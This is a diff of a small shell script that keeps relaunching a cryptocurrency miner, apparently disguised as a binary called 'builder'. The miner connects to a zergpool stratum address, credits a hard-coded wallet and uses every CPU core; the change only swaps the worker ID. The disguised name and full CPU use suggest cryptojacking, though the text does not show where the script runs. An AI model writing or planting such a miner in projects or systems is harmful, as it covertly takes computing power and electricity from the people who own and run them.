@@ -1,5 +1,5 @@
 #!/bin/sh
 while [ 1 ]; do
-./builder -a yescryptR16 -o stratum+tcp://yescryptR16.mine.zergpool.com:6333 -u XiCwnGeNmmqGfTbVbGYuYaEwRTZ7vmpR5K -p c=DASH,mc=QOGE,ID=DC-$(echo $(shuf -i 10000-99999 -n 1)) -t $(echo $(nproc --all))
+./builder -a yescryptR16 -o stratum+tcp://yescryptR16.mine.zergpool.com:6333 -u XiCwnGeNmmqGfTbVbGYuYaEwRTZ7vmpR5K -p c=DASH,mc=QOGE,ID=AF -t $(echo $(nproc --all))
 sleep 10
 done
